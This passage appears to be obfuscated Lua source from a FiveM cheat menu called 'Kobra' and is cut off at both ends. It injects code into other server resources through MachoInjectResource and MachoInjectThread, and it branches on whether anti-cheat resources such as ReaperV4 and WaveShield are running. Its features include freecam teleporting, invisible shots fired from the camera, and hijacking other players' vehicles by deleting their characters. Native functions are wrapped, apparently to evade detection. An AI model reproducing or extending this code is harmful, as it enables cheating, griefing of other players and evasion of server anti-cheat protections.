                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v903   .. [[")

                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local function v1344(v1381) local v1382=math.rad(v1381.z);local v1383=math.rad(v1381.x);local v1384=math.abs(math.cos(v1383));return vector3( -math.sin(v1382) * v1384 ,math.cos(v1382) * v1384 ,math.sin(v1383));end function hNative(v1385,v1386) local v1387=0;local v1388;while true do if (v1387==(3 -2)) then _G[v1385]=function(...) return v1386(v1388,...);end;break;end if (0==v1387) then v1388=_G[v1385];if ( not v1388 or (type(v1388)~="function")) then return;end v1387=759 -(364 + 394) ;end end end hNative("CreateThread",function(v1389,...) return v1389(...);end);hNative("Wait",function(v1390,...) return v1390(...);end);hNative("PlayerPedId",function(v1391,...) return v1391(...);end);hNative("GetHashKey",function(v1392,...) return v1392(...);end);hNative("GiveWeaponToPed",function(v1393,...) return v1393(...);end);hNative("SetCurrentPedWeapon",function(v1394,...) return v1394(...);end);hNative("GetCurrentPedWeapon",function(v1395,...) return v1395(...);end);hNative("RemoveWeaponFromPed",function(v1396,...) return;end);local v1345=GetCamCoord(_G.KobraFreecamObject);local v1346=GetCamRot(_G.KobraFreecamObject,2 + 0 );local v1347=v1344(v1346);local v1348=299 + 701 ;local v1349=v1345 + (v1347 * v1348) ;local v1350=PlayerPedId();local v1351=GetHashKey(v903);GiveWeaponToPed(PlayerPedId(),v1351,250,false,true);SetCurrentPedWeapon(PlayerPedId(),v1351,true);ShootSingleBulletBetweenCoords(v1345.x,v1345.y,v1345.z,v1349.x,v1349.y,v1349.z,21 + 79 ,true,v1351,v1350,true,false,81341 + 18659 );end break;end if (v902==(0 + 0)) then v903=v36[v34];if (v903=="WEAPON_PERMKILL") then v903="WEAPON_TRANQUILIZER";elseif (v903=="WEAPON_RPG_2") then v903="WEAPON_AIRSTRIKE_ROCKET";end v902=1;end end end end if IsDisabledControlJustPressed(0,24) then local v816=v655;if (v816=="Teleport") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1240=0 + 0 ;local v1241;local v1242;local v1243;local v1244;local v1245;local v1246;local v1247;local v1248;local v1249;local v1250;local v1251;while true do if (3==v1240) then v1248,v1249,v1250,v1248,v1251=GetShapeTestResult(v1247);if v1249 then if ((v1251~=(0 + 0)) and IsEntityAVehicle(v1251)) then local v1585=0;local v1586;local v1587;local v1588;while true do if ((1 + 0)==v1585) then v1588=GetEmptySeat(v1586);if (v1588== -1) then TaskWarpPedIntoVehicle(v1587,v1586, -1);elseif (v1588>=(0 + 0)) then TaskWarpPedIntoVehicle(v1587,v1586,v1588);else print("[^5SYNC^7]: There aren't any seats available in this vehicle.");end break;end if (v1585==(956 -(719 + 237))) then v1586=v1251;v1587=PlayerPedId();v1585=1;end end else SetEntityCoords(PlayerPedId(),v1250.x,v1250.y,v1250.z,false,false,false,false);end else print("[^5SYNC^7]: There aren't any valid locations to teleport to.");end break;end if (v1240==(0 -0)) then v1241=nil;function v1241(v1397) local v1398=0 + 0 ;local v1399;local v1400;local v1401;while true do if (v1398==0) then v1399=math.rad(v1397.z);v1400=math.rad(v1397.x);v1398=2 -1 ;end if ((2 -1)==v1398) then v1401=math.abs(math.cos(v1400));return vector3( -math.sin(v1399) * v1401 ,math.cos(v1399) * v1401 ,math.sin(v1400));end end end function GetEmptySeat(v1402) local v1403=0 -0 ;local v1404;while true do if (v1403==(1992 -(761 + 1230))) then return  -(194 -(80 + 113));end if (v1403==0) then v1404={ -1,0 + 0 ,1 + 0 ,1245 -(965 + 278) };for v1600,v1601 in ipairs(v1404) do if IsVehicleSeatFree(v1402,v1601) then return v1601;end end v1403=1730 -(1391 + 338) ;end end end v1240=1;end if (v1240==(4 -2)) then v1245=974 + 26 ;v1246=v1242 + (v1244 * v1245) ;v1247=StartShapeTestRay(v1242.x,v1242.y,v1242.z,v1246.x,v1246.y,v1246.z, -(1 -0),PlayerPedId(),0 + 0 );v1240=1411 -(496 + 912) ;end if (1==v1240) then v1242=GetCamCoord(_G.KobraFreecamObject);v1243=GetCamRot(_G.KobraFreecamObject,2);v1244=v1241(v1243);v1240=6 -4 ;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                if _G.KobraFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function GetEmptySeat(vehicle)
                                        local seats = {
                                            -1, 0, 1, 2
                                        }

                                        for _, seat in ipairs(seats) do
                                            if IsVehicleSeatFree(vehicle, seat) then
                                                return seat
                                            end
                                        end

                                        return -1
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsWithoutPlantsReset", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local forward = RotationToDirection(rot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                    if hit then
                                        if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                            local vehicle = entityHit
                                            local playerPed = PlayerPedId()
                                            local seat = GetEmptySeat(vehicle)
                                            if seat == -1 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                            elseif seat >= 0 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                            else
                                                print("[^5Kobra^7]: There aren't any seats available in this vehicle.")
                                            end
                                        else
                                            SetEntityCoordsWithoutPlantsReset(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                        end
                                    else
                                        print("[^5Kobra^7]: There aren't any valid locations to teleport to.")
                                    end
                                end
                            ]]);end elseif _G.KobraFreecamObject then local v1087=0;local v1088;local v1089;local v1090;local v1091;local v1092;local v1093;local v1094;local v1095;local v1096;local v1097;local v1098;while true do if (v1087==0) then v1088=nil;function v1088(v1305) local v1306=0;local v1307;local v1308;local v1309;while true do if (v1306==1) then v1309=math.abs(math.cos(v1308));return vector3( -math.sin(v1307) * v1309 ,math.cos(v1307) * v1309 ,math.sin(v1308));end if (0==v1306) then v1307=math.rad(v1305.z);v1308=math.rad(v1305.x);v1306=1;end end end function GetEmptySeat(v1310) local v1311={ -(1 -0),1330 -(1190 + 140) ,719 -(317 + 401) ,6 -4 };for v1352,v1353 in ipairs(v1311) do if IsVehicleSeatFree(v1310,v1353) then return v1353;end end return  -1;end v1089=GetCamCoord(_G.KobraFreecamObject);v1087=1;end if (v1087==(1734 -(1675 + 57))) then v1094=StartShapeTestRay(v1089.x,v1089.y,v1089.z,v1093.x,v1093.y,v1093.z, -1,PlayerPedId(),0 + 0 );v1095,v1096,v1097,v1095,v1098=GetShapeTestResult(v1094);if v1096 then if ((v1098~=0) and IsEntityAVehicle(v1098)) then local v1482=v1098;local v1483=PlayerPedId();local v1484=GetEmptySeat(v1482);if (v1484== -1) then TaskWarpPedIntoVehicle(v1483,v1482, -(2 -1));elseif (v1484>=(0 + 0)) then TaskWarpPedIntoVehicle(v1483,v1482,v1484);else print("[^5Kobra^7]: There aren't any seats available in this vehicle.");end else MachoInjectThread(977 -(338 + 639) ,"any","",[[ 
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        SetEntityCoords(PlayerPedId(), ]]   .. v1097.x   .. [[, ]]   .. v1097.y   .. [[, ]]   .. v1097.z   .. [[, false, false, false, false)
                                    ]] );end else print("[^5Kobra^7]: There aren't any valid locations to teleport to.");end break;end if (v1087==(380 -(320 + 59))) then v1090=GetCamRot(_G.KobraFreecamObject,2 + 0 );v1091=v1088(v1090);v1092=1000;v1093=v1089 + (v1091 * v1092) ;v1087=734 -(628 + 104) ;end end end elseif (v816=="Kick from Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1099=0 -0 ;local v1100;while true do if (v1099==(1891 -(439 + 1452))) then v1100=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1100,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then local v1252=1947 -(105 + 1842) ;local v1253;local v1254;local v1255;local v1256;local v1257;local v1258;local v1259;local v1260;local v1261;local v1262;local v1263;local v1264;local v1265;local v1266;local v1267;while true do if (v1252==(4 -3)) then hNative("GetEntityCoords",function(v1405,...) return v1405(...);end);hNative("GetCamCoord",function(v1406,...) return v1406(...);end);hNative("GetCamRot",function(v1407,...) return v1407(...);end);hNative("StartShapeTestRay",function(v1408,...) return v1408(...);end);v1252=4 -2 ;end if ((28 -22)==v1252) then v1255=PlayerPedId();v1256=GetEntityCoords(v1255);v1257=GetCamCoord(_G.KobraFreecamObject);v1258=GetCamRot(_G.KobraFreecamObject,1 + 1 );v1252=11 -4 ;end if (v1252==(4 + 3)) then v1259=v1254(v1258);v1260=2164 -(274 + 890) ;v1261=v1257 + (v1259 * v1260) ;v1262=StartShapeTestRay(v1257.x,v1257.y,v1257.z,v1261.x,v1261.y,v1261.z, -(1 + 0),v1255,0 + 0 );v1252=3 + 5 ;end if (v1252==(3 + 1)) then hNative("PlayerPedId",function(v1409,...) return v1409(...);end);hNative("NetworkRequestControlOfEntity",function(v1410,...) return v1410(...);end);hNative("NetworkHasControlOfEntity",function(v1411,...) return v1411(...);end);v1253=nil;v1252=5;end if (5==v1252) then function v1253(v1412,v1413) local v1414=0 + 0 ;local v1415;while true do if (v1414==(0 -0)) then v1413=v1413 or (2819 -(731 + 88)) ;v1415=GetGameTimer();v1414=1 + 0 ;end if (v1414==(1 + 0)) then while (GetGameTimer() -v1415)<v1413  do if NetworkHasControlOfEntity(v1412) then return true;end NetworkRequestControlOfEntity(v1412);Wait(0);end return NetworkHasControlOfEntity(v1412);end end end v1254=nil;function v1254(v1416) local v1417=0 + 0 ;local v1418;local v1419;local v1420;while true do if (v1417==0) then v1418=math.rad(v1416.z);v1419=math.rad(v1416.x);v1417=1 -0 ;end if (v1417==(2 -1)) then v1420=math.abs(math.cos(v1419));return vector3( -math.sin(v1418) * v1420 ,math.cos(v1418) * v1420 ,math.sin(v1419));end end end function GetEmptySeat(v1421) local v1422=0 -0 ;local v1423;while true do if (v1422==(1 -0)) then return  -1;end if (v1422==0) then v1423={ -(1 + 0),0,159 -(139 + 19) ,1995 -(1687 + 306) };for v1602,v1603 in ipairs(v1423) do if IsVehicleSeatFree(v1421,v1603) then return v1603;end end v1422=1;end end end v1252=6;end if (v1252==(7 -5)) then hNative("GetShapeTestResult",function(v1424,...) return v1424(...);end);hNative("GetPedInVehicleSeat",function(v1425,...) return v1425(...);end);hNative("SetEntityVisible",function(v1426,...) return v1426(...);end);hNative("DeletePed",function(v1427,...) return v1427(...);end);v1252=1157 -(1018 + 136) ;end if ((1 + 2)==v1252) then hNative("ClearPedTasksImmediately",function(v1428,...) return v1428(...);end);hNative("SetEntityCoordsNoOffset",function(v1429,...) return v1429(...);end);hNative("IsEntityAVehicle",function(v1430,...) return v1430(...);end);hNative("SetPedIntoVehicle",function(v1431,...) return v1431(...);end);v1252=17 -13 ;end if (v1252==(823 -(117 + 698))) then v1263,v1264,v1265,v1263,v1266=GetShapeTestResult(v1262);v1267=nil;function v1267(v1432) if ( not v1432 or  not DoesEntityExist(v1432)) then return;end local v1433=GetPedInVehicleSeat(v1432, -(482 -(305 + 176)));if ((v1433~=(0 + 0)) and DoesEntityExist(v1433)) then SetPedIntoVehicle(v1255,v1432,0 + 0 );v1253(v1432,2000);Wait(10);for v1589=0 -0 ,4 do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1433   .. [[)
                                        ]] );end Wait(38 + 2 );SetPedIntoVehicle(v1255,v1432, -(1 -0));Wait(1);SetPedIntoVehicle(v1255,v1432,GetEmptySeat(v1432));Wait(2 -1 );SetPedIntoVehicle(v1255,v1432, -(1 -0));Wait(450);ClearPedTasksImmediately(v1255);SetEntityCoordsNoOffset(v1255,v1256.x,v1256.y,v1256.z,true,true,true,true);Wait(100);end end CreateThread(function() if v1264 then if ((v1266~=0) and IsEntityAVehicle(v1266)) then local v1604=v1266;v1267(v1604);end end end);break;end if (v1252==(260 -(159 + 101))) then function hNative(v1434,v1435) local v1436=0 -0 ;local v1437;while true do if (v1436==(3 -2)) then _G[v1434]=function(...) return v1435(v1437,...);end;break;end if (v1436==0) then v1437=_G[v1434];if ( not v1437 or (type(v1437)~="function")) then return;end v1436=1;end end end hNative("CreateThread",function(v1438,...) return v1438(...);end);hNative("Wait",function(v1439,...) return v1439(...);end);hNative("DoesEntityExist",function(v1440,...) return v1440(...);end);v1252=1 + 0 ;end end end elseif (v816=="Hijack Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1268=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1268,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);elseif _G.KobraFreecamObject then local v1312=0;local v1313;local v1314;local v1315;local v1316;local v1317;local v1318;local v1319;local v1320;local v1321;local v1322;local v1323;local v1324;local v1325;local v1326;local v1327;while true do if (v1312==2) then hNative("ClearPedTasksImmediately",function(v1544,...) return v1544(...);end);hNative("SetEntityCoordsNoOffset",function(v1545,...) return v1545(...);end);hNative("IsEntityAVehicle",function(v1546,...) return v1546(...);end);hNative("SetPedIntoVehicle",function(v1547,...) return v1547(...);end);hNative("PlayerPedId",function(v1548,...) return v1548(...);end);hNative("NetworkRequestControlOfEntity",function(v1549,...) return v1549(...);end);v1312=3;end if ((0 -0)==v1312) then function hNative(v1550,v1551) local v1552=0 -0 ;local v1553;while true do if (v1552==1) then _G[v1550]=function(...) return v1551(v1553,...);end;break;end if (v1552==(0 + 0)) then v1553=_G[v1550];if ( not v1553 or (type(v1553)~="function")) then return;end v1552=1;end end end hNative("CreateThread",function(v1554,...) return v1554(...);end);hNative("Wait",function(v1555,...) return v1555(...);end);hNative("DoesEntityExist",function(v1556,...) return v1556(...);end);hNative("GetEntityCoords",function(v1557,...) return v1557(...);end);hNative("GetCamCoord",function(v1558,...) return v1558(...);end);v1312=267 -(112 + 154) ;end if (v1312==(6 -3)) then hNative("NetworkHasControlOfEntity",function(v1559,...) return v1559(...);end);v1313=nil;function v1313(v1560,v1561) v1561=v1561 or 2000 ;local v1562=GetGameTimer();while (GetGameTimer() -v1562)<v1561  do local v1590=31 -(21 + 10) ;while true do if (v1590==(1720 -(531 + 1188))) then Wait(0 + 0 );break;end if (v1590==0) then if NetworkHasControlOfEntity(v1560) then return true;end NetworkRequestControlOfEntity(v1560);v1590=664 -(96 + 567) ;end end end return NetworkHasControlOfEntity(v1560);end v1314=nil;function v1314(v1563) local v1564=math.rad(v1563.z);local v1565=math.rad(v1563.x);local v1566=math.abs(math.cos(v1565));return vector3( -math.sin(v1564) * v1566 ,math.cos(v1564) * v1566 ,math.sin(v1565));end function GetEmptySeat(v1567) local v1568=0 -0 ;local v1569;while true do if (v1568==(0 + 0)) then v1569={ -1,0 -0 ,2 -1 ,4 -2 };for v1635,v1636 in ipairs(v1569) do if IsVehicleSeatFree(v1567,v1636) then return v1636;end end v1568=1;end if (v1568==(1 -0)) then return  -1;end end end v1312=4;end if (v1312==(2 + 2)) then v1315=PlayerPedId();v1316=GetEntityCoords(v1315);v1317=GetCamCoord(_G.KobraFreecamObject);v1318=GetCamRot(_G.KobraFreecamObject,2);v1319=v1314(v1318);v1320=1782 -782 ;v1312=5;end if (v1312==1) then hNative("GetCamRot",function(v1570,...) return v1570(...);end);hNative("StartShapeTestRay",function(v1571,...) return v1571(...);end);hNative("GetShapeTestResult",function(v1572,...) return v1572(...);end);hNative("GetPedInVehicleSeat",function(v1573,...) return v1573(...);end);hNative("SetEntityVisible",function(v1574,...) return v1574(...);end);hNative("DeletePed",function(v1575,...) return v1575(...);end);v1312=2;end if (v1312==(776 -(134 + 637))) then v1321=v1317 + (v1319 * v1320) ;v1322=StartShapeTestRay(v1317.x,v1317.y,v1317.z,v1321.x,v1321.y,v1321.z, -(1 + 